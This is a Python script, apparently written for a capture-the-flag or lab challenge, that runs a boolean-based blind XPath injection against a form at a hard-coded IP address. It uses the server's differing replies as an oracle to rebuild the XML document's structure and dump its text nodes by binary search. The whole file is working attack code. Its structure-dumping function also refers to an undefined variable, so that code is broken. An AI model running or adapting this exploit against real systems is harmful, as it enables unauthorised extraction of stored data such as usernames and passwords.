#!/usr/bin/python3

# XPath盲注脚本 by Sunshine
import requests
import json
import sys
import time
from urllib.parse import quote, urlencode

MODE="boolean-based"
DELAY = 5 # (s)
DELAY_ms = DELAY * 1000 # (ms)
def oracle(expression):
    if (MODE == "time-based"): # XPath time-based auto exfil WIP
        print('WIP')
        return True
    elif (MODE == "boolean-based"):
        while(True):
            payload = quote(f"nonexist' or {expression} and '1'='1")
            data=f'username={payload}&message=test'
            response = requests.post("http://154.57.164.82:31912/index.php", data=data,headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=(3.0, 10.0))
            if ('Message successfully sent!' in response.text):
                return True
            elif ('User does not exist!' in response.text):
                return False
            else:
                print(f'[ERROR] Timed out or unknown response! Retry...')
    else:
        sys.exit()

def BisectionGetInteger(target):
    low = 0
    high = 50
    while low < high:
        mid = (low + high) // 2
        if oracle(f"{target}>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low

def BisectionGetString(target):
    length = BisectionGetInteger(f'string-length({target})')
    print(f'-| [BINARY SEARCH] Length: {length} | Result: ', end='')
    sys.stdout.flush()
    if length == 0:
        return ""
    alphabets = "~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_.-:"
    string = ""
    for i in range(1, length + 1):
        low = 0
        high = len(alphabets) - 1
        while low < high:
            mid = (low + high) // 2
            xpath_expr = f'string-length(substring-before("{alphabets}", substring({target},{i},1)))>{mid}'
            if oracle(xpath_expr):
                low = mid + 1
            else:
                high = mid
        if low == 0:
            string += "?" # Unknown character
            print(f'?', end='')
            sys.stdout.flush()
        else:
            current = alphabets[low]
            string += current
            print(f'{current}', end='')
            sys.stdout.flush()
    print("")
    return string

# Receive XML structure
def RecurselyBuildStructure(dict, path):
    # Retrieve child element count
    if oracle(f"count({path}*)=0"):
        print(f'[RECURSE SCAN] No child node in {path}')
        return # No child element
    ChildCount = BisectionGetInteger(f'count({path}*)')
    print(f'[RECURSE SCAN] Found {ChildCount} child node in {path}')
    while ChildCount != 0:
        NextElement = f'{path}*[{ChildCount}]'
        NextPath = f'{NextElement}/'
        ElementName = BisectionGetString(f'name({NextElement})')
        NextDict = {}
        NextDict[Name] = ElementName
        print(f'[RECURSE SCAN] Entering {NextPath} | Name {ElementName}')
        RecurselyBuildStructure(NextDict, NextPath)
        dict[ChildCount] = NextDict
        ChildCount = ChildCount - 1
    return
option = input("Dump XML Structure? (Y/n): ")
if option != "n":
    dict = {}
    path = '/'
    RecurselyBuildStructure(dict, path)

    import pprint
    pprint.pprint(dict, indent=4)

while True:
    node = input("Get Text Node ")
    print(BisectionGetString(node))
